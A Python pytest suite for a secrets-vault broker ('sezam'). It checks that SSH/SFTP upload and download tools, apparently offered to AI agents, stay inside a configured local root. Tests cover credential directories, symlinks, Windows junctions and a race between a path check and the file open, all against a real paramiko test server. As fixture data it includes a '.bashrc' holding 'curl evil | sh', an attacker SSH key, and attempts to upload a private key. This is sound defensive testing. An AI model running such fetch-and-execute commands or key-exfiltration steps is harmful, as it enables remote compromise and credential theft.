"""AI broker TODO P1: ssh_upload/ssh_download stay inside the entry's local_root.

Runs against a real paramiko SSH server with an SFTP subsystem: the local
transfer root comes from the encrypted entry policy, credential directories
and the vault are never reachable, symlinks are refused (never followed) and
downloaded files are created owner-only.
"""

from __future__ import annotations

import os
import socket
import stat
import sys
import threading
import types
from pathlib import Path

import paramiko
import pytest
from click.testing import CliRunner

from sezam import cli
from sezam.crypto.kdf import Argon2Params
from sezam.mcp import ssh as ssh_mod
from sezam.mcp.approval import ApprovalManager
from sezam.mcp.broker import MCPBroker
from sezam.mcp.ssh import SSHBrokerError, SSHManager, _fingerprint, validate_local_root
from sezam.vault.crud import Vault

FAST_PARAMS = Argon2Params(time_cost=1, memory_cost=8192, parallelism=1)
MASTER = "p1-master-password"
SSH_PASSWORD = "p1-ssh-password"


# ── real SSH server with an SFTP subsystem rooted in a temp directory ──


class _Handle(paramiko.SFTPHandle):
    def stat(self):
        return paramiko.SFTPAttributes.from_stat(os.fstat(self.readfile.fileno()))


class _SFTP(paramiko.SFTPServerInterface):
    def __init__(self, server, root: Path, *args, **kwargs):
        super().__init__(server, *args, **kwargs)
        self._root = root

    def _real(self, path: str) -> str:
        return str(self._root / path.lstrip("/"))

    def canonicalize(self, path):
        return "/" + path.lstrip("/")

    def list_folder(self, path):
        real = self._real(path)
        try:
            return [
                paramiko.SFTPAttributes.from_stat(os.lstat(os.path.join(real, name)), name)
                for name in os.listdir(real)
            ]
        except OSError as exc:
            return paramiko.SFTPServer.convert_errno(exc.errno)

    def stat(self, path):
        try:
            return paramiko.SFTPAttributes.from_stat(os.stat(self._real(path)))
        except OSError as exc:
            return paramiko.SFTPServer.convert_errno(exc.errno)

    def lstat(self, path):
        try:
            return paramiko.SFTPAttributes.from_stat(os.lstat(self._real(path)))
        except OSError as exc:
            return paramiko.SFTPServer.convert_errno(exc.errno)

    def open(self, path, flags, attr):
        try:
            fd = os.open(self._real(path), flags | getattr(os, "O_BINARY", 0), 0o644)
        except OSError as exc:
            return paramiko.SFTPServer.convert_errno(exc.errno)
        mode = "wb" if flags & os.O_WRONLY else ("r+b" if flags & os.O_RDWR else "rb")
        handle = _Handle(flags)
        handle.readfile = handle.writefile = os.fdopen(fd, mode)
        return handle

    def mkdir(self, path, attr):
        try:
            os.mkdir(self._real(path))
        except OSError as exc:
            return paramiko.SFTPServer.convert_errno(exc.errno)
        return paramiko.SFTP_OK


class _Auth(paramiko.ServerInterface):
    def get_allowed_auths(self, username):
        return "password"

    def check_auth_password(self, username, password):
        ok = username == "deploy" and password == SSH_PASSWORD
        return paramiko.AUTH_SUCCESSFUL if ok else paramiko.AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED


class _SFTPServer:
    def __init__(self, root: Path):
        self.root = root
        self.host_key = paramiko.ECDSAKey.generate()
        self._sock = socket.socket()
        self._sock.bind(("127.0.0.1", 0))
        self._sock.listen(4)
        self.port = self._sock.getsockname()[1]
        self._transports: list = []
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self):
        while True:
            try:
                conn, _ = self._sock.accept()
            except OSError:
                return
            transport = paramiko.Transport(conn)
            transport.add_server_key(self.host_key)
            transport.set_subsystem_handler("sftp", paramiko.SFTPServer, _SFTP, self.root)
            self._transports.append(transport)
            try:
                transport.start_server(server=_Auth())
            except Exception:
                continue

    def close(self):
        self._sock.close()
        for transport in self._transports:
            transport.close()


@pytest.fixture
def sftp(tmp_path):
    remote = tmp_path / "remote"
    remote.mkdir()
    server = _SFTPServer(remote)
    yield server
    server.close()


@pytest.fixture(autouse=True)
def no_user_known_hosts(monkeypatch):
    monkeypatch.setattr(paramiko.SSHClient, "load_system_host_keys", lambda self, filename=None: None)


@pytest.fixture
def home(tmp_path, monkeypatch):
    fake = tmp_path / "home"
    (fake / ".ssh").mkdir(parents=True)
    (fake / ".ssh" / "id_ed25519").write_text("PRIVATE KEY")
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: fake))
    return fake


def _broker(tmp_path: Path, sftp: _SFTPServer, local_root, actions=("ssh_download", "ssh_upload")):
    vault = Vault.create(tmp_path / "home" / ".sezam", MASTER, FAST_PARAMS)
    folder = vault.create_node("Servers")
    entry_id = vault.create_entry(
        folder,
        "web",
        [
            {"key": "host", "value": "127.0.0.1"},
            {"key": "port", "value": str(sftp.port)},
            {"key": "username", "value": "deploy"},
            {"key": "password", "value": SSH_PASSWORD, "sensitive": True},
            {"key": "host_key_sha256", "value": _fingerprint(sftp.host_key)},
        ],
        tier=0,
        allowed_actions=list(actions),
    )
    vault.update_entry(entry_id, local_root=local_root)
    default = tmp_path / "default-transfers"
    return MCPBroker(vault, ApprovalManager(), SSHManager(transfer_root=default)), vault, default


# ── policy validation ──


def test_local_root_policy_rejects_home_ancestors_vault_and_credential_dirs(home, tmp_path):
    vault_dir = home / ".sezam"
    for bad in (
        str(home),
        str(home.parent),
        str(Path(home.anchor)),
        str(home / ".ssh"),
        str(home / ".ssh" / "keys"),
        str(vault_dir),
        str(vault_dir / "sub"),
        "relative/site",
        "",
        ["/srv/site"],
        7,
    ):
        with pytest.raises(SSHBrokerError) as exc:
            validate_local_root(bad, (vault_dir,))
        assert exc.value.code == "policy_invalid", bad

    other_vault = tmp_path / "elsewhere" / "vault"
    with pytest.raises(SSHBrokerError):
        validate_local_root(str(other_vault.parent), (other_vault,))

    assert validate_local_root(str(home / "projects" / "site"), (vault_dir,)) == home / "projects" / "site"


def test_default_transfer_root_never_reaches_credential_dirs(home):
    with pytest.raises(SSHBrokerError) as exc:
        ssh_mod._confine_local_path(home, ".ssh/id_ed25519")
    assert exc.value.code == "local_path_denied"

    vault_dir = home / "custom-vault"
    with pytest.raises(SSHBrokerError) as exc:
        ssh_mod._confine_local_path(home, "custom-vault/sezam.db", (vault_dir,))
    assert exc.value.code == "local_path_denied"


# ── real SFTP transfers through the broker ──


def test_download_lands_in_entry_local_root_as_owner_only_file(home, tmp_path, sftp):
    (sftp.root / "index.html").write_bytes(b"<h1>site</h1>")
    site = home / "projects" / "site"
    site.mkdir(parents=True)
    broker, vault, default = _broker(tmp_path, sftp, str(site))

    result = broker.ssh_download("Servers/web", "/index.html", "index.html", agent_name="t")

    assert result["status"] == "ok", result
    target = site / "index.html"
    assert target.read_bytes() == b"<h1>site</h1>"
    assert not (default / "index.html").exists()
    if os.name == "posix":
        assert stat.S_IMODE(target.stat().st_mode) == 0o600
    vault.lock()


def test_local_path_outside_local_root_is_denied_even_inside_default_dir(home, tmp_path, sftp):
    (sftp.root / "a.txt").write_bytes(b"a")
    site = home / "projects" / "site"
    site.mkdir(parents=True)
    broker, vault, default = _broker(tmp_path, sftp, str(site))
    default.mkdir()

    result = broker.ssh_download("Servers/web", "/a.txt", str(default / "a.txt"), agent_name="t")

    assert result["status"] == "error" and result["code"] == "local_path_denied", result
    assert not (default / "a.txt").exists()
    vault.lock()


def test_invalid_local_root_policy_fails_closed(home, tmp_path, sftp):
    (sftp.root / ".bashrc").write_bytes(b"curl evil | sh")
    broker, vault, default = _broker(tmp_path, sftp, str(home))

    result = broker.ssh_download("Servers/web", "/.bashrc", ".bashrc", agent_name="t")

    assert result["status"] == "error" and result["code"] == "policy_invalid", result
    assert not (home / ".bashrc").exists()
    assert not (default / ".bashrc").exists()
    vault.lock()


def _symlink(link: Path, target: Path, is_dir: bool = False) -> None:
    try:
        os.symlink(target, link, target_is_directory=is_dir)
    except (OSError, NotImplementedError):
        pytest.skip("symlinks are not available")


def test_download_refuses_symlink_target(home, tmp_path, sftp):
    (sftp.root / "config").write_bytes(b"attacker")
    site = home / "projects" / "site"
    site.mkdir(parents=True)
    outside = home / ".profile"
    outside.write_bytes(b"original")
    _symlink(site / "config", outside)
    broker, vault, _ = _broker(tmp_path, sftp, str(site))

    result = broker.ssh_download(
        "Servers/web", "/config", "config", overwrite=True, agent_name="t"
    )

    assert result["status"] == "error" and result["code"] == "symlink_denied", result
    assert outside.read_bytes() == b"original"
    vault.lock()


def test_recursive_download_never_enters_an_existing_symlinked_directory(home, tmp_path, sftp):
    (sftp.root / "tree" / "conf").mkdir(parents=True)
    (sftp.root / "tree" / "conf" / "authorized_keys").write_bytes(b"ssh-ed25519 ATTACKER")
    site = home / "projects" / "site"
    (site / "tree").mkdir(parents=True)
    escape = home / "escape"
    escape.mkdir()
    _symlink(site / "tree" / "conf", escape, is_dir=True)
    broker, vault, _ = _broker(tmp_path, sftp, str(site))

    result = broker.ssh_download(
        "Servers/web", "/tree", "tree", recursive=True, overwrite=True, agent_name="t"
    )

    assert result["status"] == "error" and result["code"] == "symlink_denied", result
    assert list(escape.iterdir()) == []
    vault.lock()


def test_upload_reads_from_local_root_by_descriptor(home, tmp_path, sftp):
    site = home / "projects" / "site"
    site.mkdir(parents=True)
    (site / "app.py").write_bytes(b"print('hi')")
    broker, vault, _ = _broker(tmp_path, sftp, str(site))

    ok = broker.ssh_upload("Servers/web", "app.py", "/app.py", agent_name="t")
    denied = broker.ssh_upload(
        "Servers/web", str(home / ".ssh" / "id_ed25519"), "/key", agent_name="t"
    )

    assert ok["status"] == "ok", ok
    assert (sftp.root / "app.py").read_bytes() == b"print('hi')"
    assert denied["status"] == "error" and denied["code"] == "local_path_denied", denied
    assert not (sftp.root / "key").exists()
    vault.lock()


def _junction(link: Path, target: Path) -> None:
    """Windows directory junction: a reparse point that needs no privilege
    and that os.lstat/is_symlink do not report as a symlink."""
    if os.name != "nt":
        pytest.skip("directory junctions are Windows-only")
    import _winapi

    _winapi.CreateJunction(str(target), str(link))


def test_recursive_download_never_writes_through_a_junction(home, tmp_path, sftp):
    (sftp.root / "dir" / "sub").mkdir(parents=True)
    (sftp.root / "dir" / "sub" / "evil.txt").write_bytes(b"attacker")
    site = home / "projects" / "site"
    (site / "dir").mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    _junction(site / "dir" / "sub", outside)
    broker, vault, _ = _broker(tmp_path, sftp, str(site))

    result = broker.ssh_download(
        "Servers/web", "/dir", "dir", recursive=True, overwrite=True, agent_name="t"
    )

    assert result["status"] == "error" and result["code"] == "symlink_denied", result
    assert list(outside.iterdir()) == []
    vault.lock()


def test_download_into_a_junctioned_parent_is_denied(home, tmp_path, sftp):
    (sftp.root / "evil.txt").write_bytes(b"attacker")
    site = home / "projects" / "site"
    site.mkdir(parents=True)
    outside = tmp_path / "outside"
    outside.mkdir()
    _junction(site / "j", outside)
    broker, vault, _ = _broker(tmp_path, sftp, str(site))

    result = broker.ssh_download("Servers/web", "/evil.txt", "j/evil.txt", agent_name="t")

    assert result["status"] == "error", result
    assert result["code"] in {"symlink_denied", "local_path_denied"}, result
    assert list(outside.iterdir()) == []
    vault.lock()


def test_recursive_upload_never_reads_through_a_junction(home, tmp_path, sftp):
    site = home / "projects" / "site"
    (site / "up").mkdir(parents=True)
    (site / "up" / "ok.txt").write_bytes(b"ok")
    keys = tmp_path / "keys"
    keys.mkdir()
    (keys / "secret.txt").write_bytes(b"PRIVATE KEY")
    _junction(site / "up" / "k", keys)
    broker, vault, _ = _broker(tmp_path, sftp, str(site))

    result = broker.ssh_upload("Servers/web", "up", "/up", recursive=True, agent_name="t")

    assert result["status"] == "error" and result["code"] == "symlink_denied", result
    assert not (sftp.root / "up" / "k" / "secret.txt").exists()
    vault.lock()


def test_upload_of_a_junction_itself_is_denied(home, tmp_path, sftp):
    site = home / "projects" / "site"
    (site / "inner").mkdir(parents=True)
    (site / "inner" / "a.txt").write_bytes(b"a")
    _junction(site / "j", site / "inner")
    broker, vault, _ = _broker(tmp_path, sftp, str(site))

    result = broker.ssh_upload("Servers/web", "j", "/j", recursive=True, agent_name="t")

    assert result["status"] == "error" and result["code"] == "symlink_denied", result
    assert not (sftp.root / "j").exists()
    vault.lock()


def test_open_local_source_detects_a_file_swapped_after_the_check(tmp_path, monkeypatch):
    checked = tmp_path / "checked.txt"
    checked.write_bytes(b"harmless")
    secret = tmp_path / "secret.txt"
    secret.write_bytes(b"secret")
    real_lstat = os.lstat
    # The path was a harmless file when lstat() looked; by open() it is another file.
    monkeypatch.setattr(
        ssh_mod.os, "lstat", lambda p, *a, **k: real_lstat(checked if Path(p) == secret else p)
    )

    with pytest.raises(SSHBrokerError) as exc:
        ssh_mod._open_local_source(secret)
    assert exc.value.code == "symlink_denied"


# ── CLI ──


@pytest.fixture
def cli_vault(home, monkeypatch):
    monkeypatch.setitem(
        sys.modules,
        "keyring",
        types.SimpleNamespace(
            set_password=lambda *a: None, get_password=lambda *a: None, delete_password=lambda *a: None
        ),
    )
    vault_dir = home / ".sezam"
    monkeypatch.setenv("SEZAM_VAULT", str(vault_dir))
    monkeypatch.setattr(cli.time, "sleep", lambda _s: None)
    vault = Vault.create(vault_dir, MASTER, FAST_PARAMS)
    vault.create_entry(vault.create_node("Servers"), "web", [{"key": "host", "value": "h"}])
    vault.lock()
    return vault_dir


def _policy(vault_dir: Path) -> dict:
    vault = Vault(vault_dir)
    vault.unlock(MASTER)
    try:
        return vault.find_entry_by_path("Servers/web")
    finally:
        vault.lock()


def test_cli_mcp_policy_sets_validates_and_clears_local_root(cli_vault, home):
    site = home / "projects" / "site"
    site.mkdir(parents=True)
    run = lambda *args: CliRunner().invoke(  # noqa: E731
        cli.main, ["mcp-policy", "Servers/web", *args], input=MASTER + "\n"
    )

    assert run("--local-root", str(site)).exit_code == 0
    assert _policy(cli_vault)["local_root"] == str(site)

    for bad in (str(home), str(home / ".ssh"), str(cli_vault), str(home / "missing")):
        result = run("--local-root", bad)
        assert result.exit_code != 0, bad
        assert _policy(cli_vault)["local_root"] == str(site)

    assert run("--clear-local-root").exit_code == 0
    assert _policy(cli_vault)["local_root"] is None
